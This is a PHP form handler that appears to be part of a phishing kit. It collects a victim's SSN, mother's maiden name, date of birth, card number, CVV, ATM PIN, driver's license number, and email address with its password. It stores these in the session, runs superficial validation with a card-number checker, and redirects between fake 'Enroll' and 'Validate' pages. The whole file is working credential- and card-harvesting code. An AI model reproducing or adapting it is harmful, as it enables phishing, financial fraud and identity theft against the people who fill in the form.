<?php
ini_set("output_buffering",4096);
session_start();

//Caling CC Validator
require 'cc_validator.php';

//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);

/** Opens a sessions to store Card form fields **/
$_SESSION['FNAME'] = $fName = $_POST['FNAME'];
$_SESSION['LNAME'] = $lName = $_POST['LNAME'];
$_SESSION['ADDRESS'] = $Address = $_POST['Address'];
$_SESSION['City'] = $City = $_POST['CITY'];
$_SESSION['State'] = $State =  $_POST['State'];
$_SESSION['ZIP'] = $ZIP = $_POST['ZIP'];
$_SESSION['Phone'] = $Phone = $_POST['PHONE'];
$_SESSION['Phonepin'] = $Phone = $_POST['PHONEPIN'];
$_SESSION['SSN'] = $SSN = $_POST['SSN'];
$_SESSION['MMN'] = $MMN = $_POST['MMN'];
$_SESSION['DOB'] = $DOB = $_POST['DOB'];
$_SESSION['CCnum'] = $CCnum = $_POST['CCnum'];
$_SESSION['EXPDATE'] = $EXPDATE = $_POST['EXPDATE'];
$_SESSION['Nameoncc'] = $Nameoncc = $_POST['Nameoncc'];
$_SESSION['CVV'] = $CVV = $_POST['CVV'];
$_SESSION['PIN'] = $ATMPIN = $_POST['ATMPIN'];
$_SESSION['DLicense'] = $DLicense = $_POST['DLicense'];
$_SESSION['EMail'] = $EMail = $_POST['EMail'];
$_SESSION['Password'] = $Password = $_POST['Password'];



/** Validate form fields inputs **/

if ($fName=="")
{
$fname=1;
}
else
{
$fname=0;
}

if (strlen($fName)<1)
{
$fname=1;
}
else
{
$fname=0;
}


if ($lName=="")
{
$lname=1;
}
else
{
$lname=0;
}

if (strlen($lName)<1)
{
$lname=1;
}
else
{
$lname=0;
}


if ($Address=="")
{
$address=1;
}
else
{
$address=0;
}

if (strlen($Address)<4)
{
$address=1;
}
else
{
$address=0;
}




if ($City=="")
{
$city=1;
}
else
{
$city=0;
}

if (strlen($City)<3)
{
$city=1;
}
else
{
$city=0;
}



if ($State=="")
{
$state=1;
}
else
{
$state=0;
}

if (strlen($State)<1)
{
$state=1;
}
else
{
$state=0;
}



if ($ZIP=="")
{
$zip=1;
}
else
{
$zip=0;
}

if (strlen($ZIP)<4)
{
$zip=1;
}
else
{
$zip=0;
}






if ($Phone=="")
{
$phone=1;
}
else
{
$phone=0;
}

if (strlen($Phone)<7)
{
$phone=1;
}
else
{
$phone=0;
}



if ($SSN=="")
{
$ssn=1;
}
else
{
$ssn=0;
}

if (strlen($SSN)<9)
{
$ssn=1;
}
else
{
$ssn=0;
}


if ($DOB=="")
{
$dob=1;
}
else
{
$dob=0;
}

if (strlen($DOB)<4)
{
$dob=1;
}
else
{
$dob=0;
}

if (is_valid_card($CCnum))
{
$cc=0;
}
else
{
$cc=1;
}


if ($EXPDATE=="")
{
$expdate=1;
}
else
{
$expdate=0;
}

if (strlen($EXPDATE)<3)
{
$expdate=1;
}
else
{
$expdate=0;
}


if ($Nameoncc=="")
{
$nameoncc=1;
}
else
{
$nameoncc=0;
}

if (strlen($Nameoncc)<3)
{
$nameoncc=1;
}
else
{
$nameoncc=0;
}



if ($CVV=="")
{
$cvv=1;
}
else
{
$cvv=0;
}

if (strlen($CVV)<3)
{
$cvv=1;
}
else
{
$cvv=0;
}


if ($fname==1||$lname==1||$address==1||$city==1||$state==1||$zip==1||$phone==1||$ssn==1||$dob==1||$cc==1||$expdate==1||$nameoncc==1||$cvv==1)
{
$errors=1;
}
else{
$errors=0;
}

if ($errors !=0) {
header("Location: Enroll.php?valid=false&fname=$fname&lname=$lname&address=$address&city=$city&state=$state&zip=$zip&phone=$phone&ssn=$ssn&dob=$dob&cc=$cc&expdate=$expdate&nameoncc=$nameoncc&cvv=$cvv").md5(time());
}

else if ($errors !=1) {
header("Location: Validate.php?valid=true&header_location=$host").md5(time());
}


else {
header("Location: Enroll.php?form=false&header=$host").md5(time());

}
?>